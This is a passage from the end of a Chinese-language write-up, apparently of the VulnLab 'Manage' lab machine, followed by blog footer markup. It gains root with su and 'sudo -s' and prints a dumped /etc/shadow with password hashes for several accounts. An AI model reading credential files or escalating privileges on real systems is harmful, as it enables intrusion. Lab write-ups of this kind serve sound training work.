+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051504-c9pk5jo.png" alt="image">​</p>
+<p>這時候只要 su 切換去 <code>admin</code>​ 這個用戶，然後使用 <code>sudo -s</code>​ 就可以得到 root ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/08-vulnlab-Manage/image-20250102051410-qm888bt.png" alt="image">​</p>
+<p>‍</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@manage:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T$2Gzp9jdcIuSaORXbywn4q1<span class="variable">$rx</span>/.gBymIPOwspzEKsoOy7bySKR/i815IvFg0JVc/.9:19783:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19783:0:99999:7:::</span><br><span class="line">karl:$6<span class="variable">$oT</span>.oJAmvjQXE17Rr<span class="variable">$tRHDOhX4nwHGlUeCnAqiqgtuOiXu</span>/sNxkwSoVa36NNP.sNOFCSm.sURhglisZXD638J6cM.Km2R0emZWw8OA50:19783:0:99999:7:::</span><br><span class="line">lxd:!:19783::::::</span><br><span class="line">tomcat:$y$j9T<span class="variable">$zcEmP3Cjlp</span>.Gqi.3ED.Uy1<span class="variable">$vg</span>/1q.iztchYw8Xq/nsY8eSckZfaKBNA2gC67inqc41:19895:0:99999:7:::</span><br><span class="line">useradmin:$y$j9T<span class="variable">$lbsOgtw1Mtlq2TSVbzFIT</span>/<span class="variable">$PovOHBY3Ah4EViM1hPs4SanDo</span>.xPLHnlv3.UdNw3FwD:19895:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&text=VulnLab - Machine - Manage"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&is_video=false&description=VulnLab - Machine - Manage"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Manage&body=Check out this article: https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&title=VulnLab - Machine - Manage"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&name=VulnLab - Machine - Manage&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/03/2025/08-vulnlab-manage/&t=VulnLab - Machine - Manage"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
